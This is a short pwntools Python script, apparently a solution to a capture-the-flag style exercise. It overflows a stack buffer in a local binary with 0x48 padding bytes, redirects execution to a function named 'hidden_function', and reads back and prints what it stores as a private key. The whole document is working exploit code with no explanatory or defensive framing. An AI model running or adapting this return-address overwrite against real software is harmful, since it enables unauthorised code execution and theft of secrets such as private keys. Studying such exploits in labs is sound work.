from pwn import *

context.binary = elf = ELF('./files/s3-bucket/hr_systems_salary_module.json')

pr = process()

payload = b'\x00'*0x48
payload += p64(elf.sym['hidden_function'])
pr.sendline(payload)
pr.recvuntil(b'\n\n\n')

priv_key = pr.recvall().decode()

print(priv_key)